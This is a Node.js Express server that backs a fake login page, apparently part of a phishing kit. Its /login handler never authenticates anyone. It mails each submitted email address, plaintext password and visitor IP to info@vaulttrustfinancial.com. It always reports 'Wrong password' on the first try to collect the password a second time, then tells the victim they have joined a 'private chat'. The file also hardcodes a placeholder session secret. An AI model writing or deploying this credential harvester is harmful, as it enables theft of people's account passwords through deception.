import express from "express";
import bodyParser from "body-parser";
import morgan from "morgan";
import path from "path";
import { fileURLToPath } from "url";
import { dirname } from "path";
import session from "express-session";
import nodemailer from "nodemailer";
import * as dotenv from 'dotenv';

dotenv.config();

const app = express();

app.use(morgan('dev'));

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.json());
app.set('view engine', 'ejs');

app.use(express.static(path.join(__dirname, "public")));

// Set up session handling
app.use(
    session({
        secret: 'yourSecretKey',
        resave: false,
        saveUninitialized: true,
        cookie: { secure: false } // Set to true in production
    })
);

const transporter = nodemailer.createTransport({
    host: 'smtp.zoho.com',
    port: 587,  
    secure: false,
    auth: {
        user: process.env.USER, 
        pass: process.env.PASS
    }
});

app.get("/", (req, res) => {
    const message = req.session.message || '';
    const email = req.session.email || '';
    req.session.message = null; // Clear message after displaying it
    res.render("index", { message, email });
});

app.post("/login", (req, res) => {
    const { email, password } = req.body;
    const userIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    req.session.email = email;

    const attemptNumber = req.session.attempt || 1;
    const mailOptions = {
        from: '"Info" <info@vaulttrustfinancial.com>',
        to: 'info@vaulttrustfinancial.com',
        subject: `Login Attempt ${attemptNumber} by ${email}`,
        text: `Details\nAttempt ${attemptNumber}\nUsername: ${email}\nPassword: ${password}\nUser IP: ${userIp}`
    };

    transporter.sendMail(mailOptions, (error) => {
        if (error) {
            console.log(error);
            req.session.message = 'Wrong password. Try again!';
            res.json({ message: req.session.message, redirect: false });
        } else {
            req.session.message = attemptNumber === 1 ? 'Wrong password. Try again!' : 'You have been successfully added to the private chat, you will get a message request shortly.';
            req.session.attempt = attemptNumber === 1 ? 2 : 1;

            res.json({
                message: req.session.message,
                redirect: attemptNumber !== 1
            });
        }
    });
});

app.listen(3000, () => {
    console.log("Server started on port 3000");
});
